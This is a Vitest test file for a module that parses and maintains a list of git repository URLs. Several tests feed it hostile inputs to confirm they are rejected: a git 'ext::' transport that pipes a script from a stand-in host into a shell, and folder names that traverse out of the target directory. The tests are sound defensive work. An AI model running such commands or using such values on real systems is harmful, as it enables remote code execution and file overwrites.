import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import {
  addToReposList,
  parseReposList,
  readReposList,
  repoNameFromUrl,
  reposListTemplate,
} from '../src/repos-list.js';
import { makeTempDir } from './helpers.js';

describe('repoNameFromUrl', () => {
  it('derives the folder name from the usual URL shapes', () => {
    expect(repoNameFromUrl('https://github.com/acme/billing-api.git')).toBe('billing-api');
    expect(repoNameFromUrl('https://github.com/acme/billing-api')).toBe('billing-api');
    expect(repoNameFromUrl('https://github.com/acme/billing-api/')).toBe('billing-api');
    expect(repoNameFromUrl('git@github.com:acme/checkout-service.git')).toBe('checkout-service');
    expect(repoNameFromUrl('ssh://git@gitlab.com/team/sub/group/thing.git')).toBe('thing');
  });

  it('refuses names that would escape the repos folder', () => {
    expect(repoNameFromUrl('https://evil.test/a/..')).toBeNull();
    expect(repoNameFromUrl('https://evil.test/a/b%2F..%2Fetc')).toBeNull();
    expect(repoNameFromUrl('https://evil.test/')).toBeNull();
  });
});

describe('parseReposList', () => {
  it('reads one URL per line and ignores comments and blanks', () => {
    const { entries, problems } = parseReposList(
      ['# my services', '', 'https://github.com/acme/one.git', '  ', 'git@github.com:acme/two.git', '# trailing note'].join(
        '\n',
      ),
    );
    expect(problems).toEqual([]);
    expect(entries).toEqual([
      { name: 'one', url: 'https://github.com/acme/one.git' },
      { name: 'two', url: 'git@github.com:acme/two.git' },
    ]);
  });

  it('accepts "name = url" to override the folder name', () => {
    const { entries } = parseReposList('billing = https://gitlab.com/acme/a-very-long-name.git');
    expect(entries).toEqual([{ name: 'billing', url: 'https://gitlab.com/acme/a-very-long-name.git' }]);
  });

  it('expands the owner/repo shorthand people paste from GitHub', () => {
    const { entries, problems } = parseReposList('sindresorhus/is-up-cli');
    expect(problems).toEqual([]);
    expect(entries).toEqual([
      { name: 'is-up-cli', url: 'https://github.com/sindresorhus/is-up-cli.git' },
    ]);
  });

  it('takes the shorthand on the right of a name too', () => {
    const { entries } = parseReposList('shorter = acme/a-long-repository-name');
    expect(entries).toEqual([
      { name: 'shorter', url: 'https://github.com/acme/a-long-repository-name.git' },
    ]);
  });

  it('does not mistake a deeper path for the shorthand', () => {
    const { entries, problems } = parseReposList('one/two/three');
    expect(entries).toEqual([]);
    expect(problems).toHaveLength(1);
  });

  it('rejects transports that let git run a command', () => {
    const { entries, problems } = parseReposList(
      ['ext::sh -c "curl evil.test | sh"', 'https://github.com/acme/ok.git'].join('\n'),
    );
    expect(entries.map((e) => e.name)).toEqual(['ok']);
    expect(problems.join(' ')).toMatch(/line 1/);
  });

  it('rejects a name that would write outside the folder', () => {
    const { entries, problems } = parseReposList('../../etc = https://github.com/acme/ok.git');
    expect(entries).toEqual([]);
    expect(problems.join(' ')).toMatch(/line 1/);
  });

  it('keeps the first of a duplicated name and says so', () => {
    const { entries, problems } = parseReposList(
      ['https://github.com/a/dup.git', 'https://github.com/b/dup.git'].join('\n'),
    );
    expect(entries).toEqual([{ name: 'dup', url: 'https://github.com/a/dup.git' }]);
    expect(problems.join(' ')).toMatch(/dup/);
  });

  it('reports a bad line without discarding the good ones', () => {
    const { entries, problems } = parseReposList(
      ['https://github.com/acme/good.git', 'not a url at all'].join('\n'),
    );
    expect(entries.map((e) => e.name)).toEqual(['good']);
    expect(problems).toHaveLength(1);
  });
});

describe('readReposList', () => {
  it('treats a missing file as an empty list, not an error', () => {
    const root = makeTempDir('expert-list-');
    expect(readReposList(path.join(root, 'nope.txt'))).toEqual({ entries: [], problems: [] });
  });

  it('reads a file that only has the template in it as empty', () => {
    const root = makeTempDir('expert-list-');
    const file = path.join(root, 'repos.txt');
    fs.writeFileSync(file, reposListTemplate());
    expect(readReposList(file).entries).toEqual([]);
  });
});

describe('addToReposList', () => {
  it('creates the file with its instructions, then appends the URL', () => {
    const root = makeTempDir('expert-list-');
    const file = path.join(root, 'nested', 'repos.txt');
    const res = addToReposList(file, ['https://github.com/acme/one.git']);

    expect(res.added).toEqual([{ name: 'one', url: 'https://github.com/acme/one.git' }]);
    const body = fs.readFileSync(file, 'utf8');
    expect(body).toMatch(/expert sync/);
    expect(body).toMatch(/https:\/\/github\.com\/acme\/one\.git$/m);
    expect(readReposList(file).entries).toHaveLength(1);
  });

  it('does not add the same project twice', () => {
    const root = makeTempDir('expert-list-');
    const file = path.join(root, 'repos.txt');
    addToReposList(file, ['https://github.com/acme/one.git']);
    const second = addToReposList(file, ['https://github.com/acme/one.git']);
    expect(second.added).toEqual([]);
    expect(second.alreadyListed).toEqual(['one']);
    expect(readReposList(file).entries).toHaveLength(1);
  });

  it('rejects a bad URL and leaves the file untouched', () => {
    const root = makeTempDir('expert-list-');
    const file = path.join(root, 'repos.txt');
    fs.writeFileSync(file, '# mine\n');
    const res = addToReposList(file, ['ext::sh -c evil']);
    expect(res.added).toEqual([]);
    expect(res.problems).toHaveLength(1);
    expect(fs.readFileSync(file, 'utf8')).toBe('# mine\n');
  });

  it('appends cleanly to a file that does not end in a newline', () => {
    const root = makeTempDir('expert-list-');
    const file = path.join(root, 'repos.txt');
    fs.writeFileSync(file, 'https://github.com/acme/one.git');
    addToReposList(file, ['https://github.com/acme/two.git']);
    expect(readReposList(file).entries.map((e) => e.name)).toEqual(['one', 'two']);
  });
});

describe('reposListTemplate', () => {
  it('explains the format so an empty file is still self-documenting', () => {
    const t = reposListTemplate();
    expect(t).toMatch(/expert sync/);
    expect(t).toMatch(/one .*per line/i);
    // Every non-blank line must be a comment, or `expert sync` would try to clone the docs.
    for (const line of t.split('\n')) {
      if (line.trim().length > 0) expect(line.trimStart().startsWith('#')).toBe(true);
    }
  });
});
